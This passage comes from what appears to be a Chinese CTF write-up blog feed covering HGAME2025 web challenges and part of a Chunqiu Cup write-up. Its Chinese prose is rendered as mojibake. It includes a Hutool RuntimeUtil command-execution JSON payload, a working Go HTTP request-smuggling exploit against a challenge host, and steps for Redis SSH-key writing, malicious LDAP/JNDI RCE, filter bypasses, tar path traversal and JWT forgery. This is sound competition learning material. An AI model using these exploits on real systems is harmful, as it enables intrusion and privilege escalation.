<span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;registerBean&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;evilCmd&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arg1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è§¦å‘ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;evilCmd&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;execForStr&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ipconfig&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œè¦ä¼ æ•°ç»„å½¢å¼ï¼Œä¹Ÿå°±æ˜¯å†™ä¸ªä¸­æ‹¬å·é‚£ç§ã€‚</p><p><img src="/2025/02/04/HGAME2025-WEB/10a9a1b766fb5da8b4a528a46f79ecbe.png" alt="img"></p><p>è¿œç¨‹ä¸€æŠŠé€šï¼Œä½†æ˜¯åå¼¹shellæœ‰ç‚¹é—®é¢˜ï¼Œå¯èƒ½æ˜¯ä¸å‡ºç½‘ï¼Œè¿™é‡Œå°±ç›´æ¥è¯»äº†ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250219005621394.png" alt="image-20250219005621394"></p><h2 id="Level-111-ä¸å­˜åœ¨çš„è½¦å¢"><a href="#Level-111-ä¸å­˜åœ¨çš„è½¦å¢" class="headerlink" title="Level 111 ä¸å­˜åœ¨çš„è½¦å¢"></a>Level 111 ä¸å­˜åœ¨çš„è½¦å¢</h2><p>ç»™çš„æºç å¯ä»¥å‘ç°å®ƒè‡ªå·±åˆ†äº†å‰åç«¯é€»è¾‘ï¼Œå‰ç«¯ç”¨proxyæ¥æ”¶HTTPè¯·æ±‚ï¼Œåç«¯è‡ªå·±å†™äº†ä¸ªH111åè®®æ¥æ”¶proxyäº¤ä»˜çš„è¯·æ±‚å¹¶ç»™å‡ºresponseã€‚</p><p>è¿™é‡Œå…¶å®å¾ˆå®¹æ˜“æƒ³åˆ°HTTPè¯·æ±‚èµ°ç§çš„æ‰“æ³•ï¼Œè€Œè¿™é‡Œåªéœ€è¦æ‰¾åˆ°å‰åç«¯åˆ†æ®µå‡ºç°æ­§ä¹‰çš„åœ°æ–¹ï¼Œå°±å¯ä»¥åœ¨å‰ç«¯GETè®¿é—®<code>/</code>æ—¶åŒæ—¶èµ°ç§POSTè¯·æ±‚è®©åç«¯è®¿é—®<code>/flag</code>ã€‚</p><p>æ³¨æ„åˆ°ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214005955940.png" alt="image-20250214005955940"></p><p>bodyLengthä½¿ç”¨çš„æ˜¯uint16å‚¨å­˜ï¼Œå³èŒƒå›´ä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure><p>è€Œä¸”GETè¯·æ±‚å…¶å®æ˜¯èƒ½æºå¸¦bodyçš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥æ‰“ä¸€ä¸ªè¯·æ±‚çš„æº¢å‡ºï¼Œç¬¬ä¸€æ®µæº¢å‡ºè®©ä»–ä¸¢å¼ƒå‰é¢65535é•¿åº¦çš„åŒ…ä»è€ŒæŠŠåé¢èµ°ç§çš„POSTè¯·æ±‚å½“ä½œæ–°çš„è¯·æ±‚å‘åç«¯è¦flagã€‚</p><p>åªæ˜¯æœ¬åœ°å’Œé¶æœºè·‘çš„æ—¶å€™å®¹æ˜“å®•æœºï¼Œæœ¬åœ°è°ƒè¯•çš„æ—¶å€™ä¹Ÿå®¹æ˜“æ­»ï¼Œè¿œç¨‹æ˜¯å¤§æ¦‚æ‰“2-3æ¬¡å¯ä»¥èµ°ç§æˆåŠŸç›´æ¥è·å¾—flagï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>anyChars := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;whatever&quot;</span>)<br>expected := []<span class="hljs-type">byte</span>&#123;<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x04</span>, <span class="hljs-comment">// method length</span><br><span class="hljs-number">0x50</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-comment">// method: POST</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-comment">// URI length</span><br><span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-comment">// URI: /flag</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// header count</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// body length</span><br>&#125;<br>padding := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">65519</span>) <span class="hljs-comment">// 65536 - 17 = 65519</span><br>body := <span class="hljs-built_in">append</span>(anyChars, expected...)<br>body = <span class="hljs-built_in">append</span>(body, padding...)<br><br><span class="hljs-comment">// åˆ›å»ºè¯·æ±‚</span><br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://175.27.221.240:30154&quot;</span>, bytes.NewReader(body))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error creating request:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>req.Header.Set(<span class="hljs-string">&quot;Content-Length&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-built_in">len</span>(body)))<br><br><span class="hljs-comment">// å‘é€è¯·æ±‚</span><br>client := &amp;http.Client&#123;&#125;<br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error sending request:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-comment">// è¯»å–å“åº”</span><br>respBody, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;error reading response:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;Response received:&quot;</span>, <span class="hljs-type">string</span>(respBody))<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/ba68576286f795075a256585025a437a.png" alt="img"></p><p><a href="https://blog.csdn.net/u011410254/article/details/140543297">go ä¸­çš„uint16ã€int16 ã€int32åŒºåˆ«å’Œè½¬æ¢é—®é¢˜åŠå…¶ä»–ç»†èŠ‚ç†è§£-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_32261191/article/details/140269419">HTTP è¯·æ±‚èµ°ç§æ¼æ´è¯¦è§£_request smuggling-CSDNåšå®¢</a></p><p><a href="https://www.freebuf.com/articles/web/375462.html">é«˜çº§æ¼æ´ç¯‡ä¹‹HTTPè¯·æ±‚èµ°ç§ä¸“é¢˜ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h2 id="Level-257-æ—¥è½çš„ç´«ç½—å…°"><a href="#Level-257-æ—¥è½çš„ç´«ç½—å…°" class="headerlink" title="Level 257 æ—¥è½çš„ç´«ç½—å…°"></a>Level 257 æ—¥è½çš„ç´«ç½—å…°</h2><p>æœ€å–œæ¬¢çš„ä¸€é“ï¼Œè¿™é“é¢˜æ‹¿ä¸‹äº†ä¸€è¡€ã€‚</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010406872.png" alt="image-20250214010406872"></p><p>ç»™äº†ä¸¤ä¸ªtcpå®¹å™¨ï¼Œå¾ˆå®¹æ˜“å‘ç°ç¬¬ä¸€ä¸ªæ˜¯sshçš„æœåŠ¡ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªredisçš„æœåŠ¡ï¼Œé¢˜ç›®ç»™å‡ºäº†user.txtï¼Œæœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯æ‰“sshçš„çˆ†ç ´ï¼Œå¤§ç±³è€å¸ˆåœ¨è¿™é‡Œçˆ†äº†å¾ˆä¹…å¾ˆä¹…hhh</p><p>å…¶å®ä¸ç„¶ï¼Œå‘ç°ç¬¬äºŒä¸ªæ˜¯redisåï¼Œå°±èƒ½æƒ³åˆ°å¯èƒ½æ˜¯æ‰“redisçš„æšä¸¾ç”¨æˆ·ç™»å½•ï¼Œç„¶åå†™å…¬é’¥æˆ–è€…å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellè¿™ç§ã€‚</p><p>æ‰¾åˆ°å·¥å…·å¯ä»¥ä¸€é”®æ‰“ç”¨æˆ·æšä¸¾å¹¶å†™å…¬é’¥ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010730959.png" alt="image-20250214010730959"></p><p>å‘ç°mysidç”¨æˆ·å·²ç»å†™å…¥äº†æˆ‘ä»¬çš„å…¬é’¥ï¼Œé‚£ä¹ˆç›´æ¥SSHè¿æ¥ç¬¬ä¸€ä¸ªé¶æœºï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010755617.png" alt="image-20250214010755617"></p><p>æ‹¿åˆ°shellåï¼Œå¯ä»¥å‘ç°æ ¹ç›®å½•ç¡®å®æœ‰flagï¼Œä½†æ˜¯æ²¡æƒé™è¯»ã€‚</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010919987.png" alt="image-20250214010919987"></p><p>suidææƒä¹Ÿæ— æœï¼Œ<code>ps -aux</code>çœ‹çœ‹è¿›ç¨‹ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214010952032.png" alt="image-20250214010952032"></p><p>å‘ç°&#x2F;appä¸‹ä»¥rootæƒé™å¯åŠ¨äº†ä¸€ä¸ªjaråŒ…ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸å‡ºæ„æ–™å°±æ˜¯æ‰“javaäº†ã€‚</p><p>æ‹–ä¸‹æºç è¿›è¡Œå®¡è®¡ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214011107140.png" alt="image-20250214011107140"></p><p>ä½¿ç”¨çš„æ˜¯searchæ–¹æ³•æ¥è¿›è¡ŒldapæœåŠ¡å®¢æˆ·ç«¯çš„é…ç½®ï¼Œè¿™é‡Œç›´æ¥æ‰“JNDIä¸å¯è¡Œã€‚</p><p>è€Œä¸”sshé‚£ä¸ªæœºå­å…¶å®æ²¡æœ‰å‘ç°æœåŠ¡ç«¯çš„ä¸œè¥¿ï¼Œæºç é…ç½®é‡Œçš„<code>ldapurl</code>æ˜¯æœ¬åœ°çš„389ç«¯å£ï¼Œè€Œæœºå™¨ä¸Š389ç«¯å£å•¥ä¹Ÿæ²¡æœ‰ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯åº”è¯¥å°±æ˜¯è‡ªå·±å†™ä¸€ä¸ªæ¶æ„LdapServerä¸Šå»ï¼Œç„¶åRCEã€‚</p><p>è¿™é“é¢˜åŸé¢˜è¢«èµµå“¥ä¸€çœ¼ä¸çœŸäº†ï¼Œå¤ªèµ›æ£äº†ï¼š</p><p>[JQCTF2024ã€RCTF2024 Web Writeup - Boogiepop Doesnâ€™t Laugh](<a href="https://boogipop.com/2024/05/27/JQCTF2024%E3%80%81RCTF2024">https://boogipop.com/2024/05/27/JQCTF2024ã€RCTF2024</a> Web Writeup&#x2F;#OpenYourEyesToSeeTheWorld)</p><p>æ€è·¯å¦‚ä¸Šä¸åœ¨èµ˜è¿°ï¼Œæ‰“ä¸€ä¸ªJacksonçš„POJONodeè§¦å‘å°±å¯ä»¥JNDIäº†ã€‚</p><p>æœ¬åœ°è°ƒè¯•ç›´æ¥é€šäº†ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/49dda3b43e34308038b3abfa77db7cd6.png" alt="img"></p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜æ˜¯è¿œç¨‹ç¯å¢ƒæ˜¯ä¸å‡ºç½‘çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åå¼¹ä¸ªrootçš„shellã€‚</p><p>ä½†æ˜¯sshæˆ‘ä»¬èƒ½ç›´æ¥ç™»å½•ï¼Œæ‰€ä»¥ä¸éœ€è¦æ‰“å†…å­˜é©¬ï¼Œåªéœ€è¦chmodä¸ª777å°±okã€‚</p><p>é¶æœºè¿˜è´´å¿ƒçš„ç»™äº†curlï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åœ¨sshæœºå™¨ä¸Šäº¤äº’å°±å®Œäº‹äº†ï¼Œè™½ç„¶æœ‰ç­‰å·&#x3D;çš„é»‘åå•ï¼ŒåŸé¢˜ç”¨jsonä¸‹çš„unicodeç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥urlç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://127.0.0.1:8080/search -d <span class="hljs-string">&quot;baseDN=dc%3Djavasec,dc%3Deki,dc%3Dxyz%2F0&amp;filter=(cn%3Dtest)&quot;</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæ€ä¹ˆæŠŠè¿™ä¸ªæœåŠ¡å¼„è¿‡å»å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬è¿˜èƒ½å‘ç°javaå¹¶æ²¡æœ‰åœ¨&#x2F;binæˆ–è€…&#x2F;usr&#x2F;biné‡Œï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/1524682e0aa65a1afa26a85a6dd3f59f.png" alt="img"></p><p>è€Œä¸”è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œç”±äº389ç«¯å£ä½äº1000ï¼Œè€Œä½äº1000çš„ç«¯å£ä¸€èˆ¬æ²¡rootä¸èƒ½è‡ªå·±èµ·ã€‚æ‰€ä»¥ç›´æ¥ä¼ jaråŒ…è¿‡å»æœ¬åœ°èµ·è¿™ä¸ªåšæ³•è‚¯å®šæ˜¯è¡Œä¸é€šçš„ã€‚</p><p>æ‰€ä»¥éœ€è¦ç”¨ç±»ä¼¼æ‰“æ¸—é€çš„æ€è·¯è§£é¢˜ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ°sshçš„ç«¯å£è½¬å‘ï¼Œæˆ‘ä»¬åœ¨vpsä¸Šèµ·è¿™ä¸ªæœåŠ¡ï¼Œç„¶åè½¬å‘åˆ°è¿™ä¸ªsshçš„389ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i ~/.ssh/id_rsa -p 30376 -R 389:localhost:389 -R 8888:localhost:8888 mysid@node1.hgame.vidar.club -N<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214012030837.png" alt="image-20250214012030837"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214012115679.png" alt="image-20250214012115679"></p><p>é…£ç•…æ·‹æ¼“ï¼Œå¤§å¿«äººå¿ƒï¼</p><hr><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æ€»ä¹‹è¿™æ¬¡çš„hgameé¢˜ç›®è´¨é‡ä¸é”™ï¼Œç¬¬äºŒå‘¨ä¹Ÿè¿˜æ˜¯æŒºå¥½ç©çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹æ¯å†¬å­£èµ›2024-2025-WEB</title>
    <link href="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/"/>
    <url>/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ˜å¤©è¥¿æ¹–ï¼Œä»Šå¤©ç»ƒç»ƒã€‚</p><p>webç¬¬ä¸€å¤©æŒºç®€å•çš„ã€‚</p><h2 id="day1-easy-flask"><a href="#day1-easy-flask" class="headerlink" title="day1-easy_flask"></a>day1-easy_flask</h2><p>SSTIä¸€æŠŠæ¢­ï¼Œæ²¡å•¥å¥½è®²ã€‚</p><h2 id="day1-file-copy"><a href="#day1-file-copy" class="headerlink" title="day1-file_copy"></a>day1-file_copy</h2><p>ç»™äº†ä¸€ä¸ªcopyçš„äº¤äº’ï¼Œsourceå¯æ§ï¼Œä½†æ˜¯destinationä¸å¯æ§ï¼Œä½†æ˜¯ä¼šå›æ˜¾sourceæ–‡ä»¶çš„byteså¤§å°ï¼Œè¿™é‡Œå°±æƒ³åˆ°äº†php-filter-chainï¼Œé€šè¿‡ç›²æ³¨æ¥å°†flagå¸¦å‡ºæ¥ã€‚</p><p>å…·ä½“åŸç†ä¸è¯´äº†ï¼Œç½‘ä¸Šåˆ†æphpchainçš„ä¹Ÿæœ‰å¾ˆå¤šã€‚</p><p>å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥å¸¦index.phpçœ‹çœ‹å®ƒåˆ°åº•æ˜¯å•¥æºç ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000435617.png" alt="image-20250118000435617"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;path&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$path</span>, <span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<br>        <span class="hljs-variable">$size</span> = @<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<br>        <br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>            <span class="hljs-string">&#x27;size&#x27;</span> =&gt; <span class="hljs-variable">$size</span><br>        ]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>HTMLå°±ä¸è¯»äº†ï¼Œå¤ªå¤šäº†åˆè¦ç­‰10minâ€¦</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250117234146293.png" alt="image-20250117234146293"></p><p>æœ€åè¿˜å·®ä¸€ä¸ªä¸€é—ªè€Œé€çš„bï¼Œå¾ˆå·§çš„æ˜¯ä¹Ÿæœ‰å·¥å…·èƒ½ä¸€æŠŠæ¢­äº†ã€‚</p><h2 id="day1-Gotar"><a href="#day1-Gotar" class="headerlink" title="day1-Gotar"></a>day1-Gotar</h2><p>ç¬¬ä¸€å¤©å”¯ä¸€æœ‰ç‚¹ä¸œè¥¿çš„Webé¢˜ã€‚</p><p>ç»™äº†goçš„æºç ï¼Œå…¶å®æ— éå°±ä¿©ç‚¹ï¼Œä¸€ä¸ªæ˜¯tarçš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„ç©¿è¶Šï¼Œä¸€ä¸ªæ˜¯jwtçš„ä¼ªé€ è¶Šæƒã€‚</p><p>è¯»ä¸€ä¸‹jwtå¤„ç†çš„æºç ï¼Œä¸éš¾å‘ç°åªè¦æ‹¿åˆ°äº†ç¯å¢ƒå˜é‡çš„jwtKeyå°±èƒ½ä¸ºæ‰€æ¬²ä¸ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Claims <span class="hljs-keyword">struct</span> &#123;<br>UserID  <span class="hljs-type">uint</span><br>IsAdmin <span class="hljs-type">bool</span><br>jwt.StandardClaims<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateJWT</span><span class="hljs-params">(userID <span class="hljs-type">uint</span>, isAdmin <span class="hljs-type">bool</span>, jwtKey []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>expirationTime := time.Now().Add(<span class="hljs-number">24</span> * time.Hour)<br>claims := &amp;Claims&#123;<br>UserID:  userID,<br>IsAdmin: isAdmin,<br>StandardClaims: jwt.StandardClaims&#123;<br>ExpiresAt: expirationTime.Unix(),<br>&#125;,<br>&#125;<br><br>token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)<br><span class="hljs-keyword">return</span> token.SignedString(jwtKey)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> JWTKey []<span class="hljs-type">byte</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LoadEnv</span><span class="hljs-params">()</span></span> &#123;<br>Env, err := godotenv.Read()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Error loading .env file&quot;</span>)<br>&#125;<br>JWTKey = []<span class="hljs-type">byte</span>(Env[<span class="hljs-string">&quot;JWT_SECRET&quot;</span>])<br>log.Print(JWTKey)<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ˜¾ç„¶è¿™é‡Œæ˜¯ä¸èƒ½Rçš„ã€‚å¾ˆè‡ªç„¶æˆ‘ä»¬å°±ä¼šæƒ³åˆ°èƒ½ä¸èƒ½envçš„jwtKeyç»™è¦†ç›–æ‰æˆä¸ºæˆ‘ä»¬è‡ªå·±çš„å¯æ§keyï¼Œç„¶åè‡ªå·±é€ ä¸€ä¸ªadminçš„cookieä¸å°±å®Œäº‹äº†ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆè¦†ç›–å‘¢ï¼Ÿå¯ä»¥å‘ç°tar-utilsä¾èµ–çš„outputPathå‡½æ•°å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250117235648502.png" alt="image-20250117235648502"></p><p>é¦–å…ˆï¼Œå‡½æ•°å°†<code>tarPath</code>æŒ‰ç…§æ–œæ ï¼ˆ&#x2F;ï¼‰åˆ†å‰²æˆå¤šä¸ªå…ƒç´ ï¼Œç„¶åç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆé€šå¸¸æ˜¯æ ¹ç›®å½•ï¼‰æ¥ç€å°†è¿™äº›å…ƒç´ é‡æ–°ç»„åˆæˆä¸€ä¸ªè·¯å¾„å­—ç¬¦ä¸²ï¼Œæœ€åå°†è¿™ä¸ªè·¯å¾„åŸºäº<code>Extractor</code>çš„<code>Path</code>å±æ€§è¿›è¡Œé‡å®šä½ã€‚</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000712833.png" alt="image-20250118000712833"></p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250118000724815.png" alt="image-20250118000724815"></p><p>å¯ä»¥å‘ç°<code>extractDir</code>ã€<code>extractSymlink</code>ã€<code>extractFile</code>éƒ½è°ƒç”¨äº†è¿™ä¸ª<code>outputPath</code>å‡½æ•°ã€‚</p><p>ä¸éš¾å‘ç°æºç ä¸­controllers&#x2F;file.goä½¿ç”¨äº†<code>extractTar</code>è°ƒç”¨äº†è¯¥ä¾èµ–åº“å®ç°è§£å‹taråŒ…ï¼Œå› æ­¤å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">extractTar</span><span class="hljs-params">(tarPath <span class="hljs-type">string</span>, userID <span class="hljs-type">uint</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>userDir := filepath.Join(extractedDir, fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, userID))<br>err := 